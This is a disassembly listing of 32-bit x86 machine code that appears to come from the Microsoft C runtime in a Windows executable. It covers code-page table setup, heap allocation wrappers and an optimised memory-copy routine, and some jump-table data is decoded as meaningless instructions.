  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
